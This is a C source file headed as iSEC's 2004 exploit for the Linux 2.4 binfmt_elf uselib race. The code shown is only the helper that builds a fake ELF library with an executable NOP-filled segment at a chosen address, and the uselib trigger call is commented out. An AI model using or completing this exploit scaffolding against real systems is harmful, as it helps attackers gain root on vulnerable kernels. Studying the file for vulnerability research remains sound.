/*
 *	binfmt_elf uselib VMA insert race vulnerability
 *	v1.09
 *	tested only on 2.4.x and gcc 2.96
 *
 *	gcc -O2 -fomit-frame-pointer elflbl.c -o elflbl
 *
 *	Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
 *
 *	THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
 *	AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 *	WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 */


#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <syscall.h>
#include <limits.h>

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <sys/sysinfo.h>

#include <linux/elf.h>
#include <linux/linkage.h>

#include <asm/page.h>
#include <asm/ldt.h>
#include <asm/segment.h>

//	make fake ELF library
void make_lib(const char* libname, unsigned long lib_addr, size_t LIB_SIZE)
{
struct elfhdr eh;
struct elf_phdr eph;
static char tmpbuf[PAGE_SIZE];
int fd;

//	make our elf library
	umask(022);
	unlink(libname);
	fd=open(libname, O_RDWR|O_CREAT|O_TRUNC, 0755);
	if(fd<0) exit(-1);//fatal("open lib ("LIBNAME" not writable?)", 0);
	memset(&eh, 0, sizeof(eh) );

//	elf exec header
	memcpy(eh.e_ident, ELFMAG, SELFMAG);
	eh.e_type = ET_EXEC;
	eh.e_machine = EM_386;
	eh.e_phentsize = sizeof(struct elf_phdr);
	eh.e_phnum = 1;
	eh.e_phoff = sizeof(eh);
	write(fd, &eh, sizeof(eh) );

//	section header:
	memset(&eph, 0, sizeof(eph) );
	eph.p_type = PT_LOAD;
	eph.p_offset = 4096;
	eph.p_filesz = 4096;
	eph.p_vaddr = lib_addr;
	eph.p_memsz = LIB_SIZE;
	eph.p_flags = PF_W|PF_R|PF_X;
	write(fd, &eph, sizeof(eph) );

//	execable code
	lseek(fd, 4096, SEEK_SET);
	memset(tmpbuf, 0x90, sizeof(tmpbuf) );
	write(fd, &tmpbuf, sizeof(tmpbuf) );
	close(fd);
}

int main(int argc, char** argv){
	unsigned long base = strtoul(argv[2], NULL, 0);
	unsigned long len = strtoul(argv[3], NULL, 0);
	printf("mklib base=%lx len=%lu\n", base, len);
	make_lib(argv[1], base, len);
	return 0;//sys_uselib(argv[1]);
}
